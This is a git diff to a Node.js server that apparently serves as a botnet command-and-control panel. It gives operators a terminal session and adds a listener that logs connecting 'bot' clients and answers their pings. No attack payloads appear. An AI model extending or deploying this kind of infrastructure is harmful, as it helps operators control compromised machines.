@@ -13,10 +13,10 @@ const Banners = require("./banners/main.js");
 
 const Extra = require("./Extra/main.js");
 const eExtra = require("./Extra/functions.js");
+const { connect } = require("http2");
 
 
 Server.svr.on('connection', async function(socket) {
-    socket.setEncoding('utf8');
     eExtra.set_TerminalSize(40, 80, socket);
 
     /*
@@ -78,6 +78,7 @@ Server.svr.on('connection', async function(socket) {
     /* End Of User Connecting Process */
     socket.write(Config.hostname(username))
     socket.on('data', async function(data) {
+        socket.setEncoding('utf8');
         Server.setInfo(socket.remoteAddress.replace("::ffff:", ""), socket.remotePort);
         let inputCMD = data.toString().replace(/(\r\n|\n|\r)/gm,"");
         let Current = Crud.GetCurrentUser(Server.Socket_Info.UserIP).split(",");
@@ -136,4 +137,26 @@ Server.svr.on('connection', async function(socket) {
         socket.on('error', function(err) {
             console.log("[NODEJS SERVER ERROR(IGNORE)]: " + err + "\r\n");
         });
+});
+
+Server.bot.on('connection', function(socket) {
+    Server.setBotInfo(socket.remoteAddress.replace("::ffff:", ""), socket.remotePort);
+
+    
+    console.log('A Bot connection has been established\r\nClient IP: ' + Server.Bot_Socket.BotIP + ":" + Server.Bot_Socket.BotPORT + "\r\n\r\n");
+
+    socket.on('data', function(data) {
+        let inputCMD = data.toString().replace(/(\r\n|\n|\r)/gm,"");
+        if(inputCMD === "ping") {
+            socket.write("ping");
+        } 
+    })
+
+    socket.on('end', function() {
+        console.log('Bot Left...........\r\n\r\n');
+    });
+
+    socket.on('error', function(err) {
+        console.log("[NODEJS BOT ERROR(IGNORE)]: " + err + "\r\n\r\n");
+    });
 });
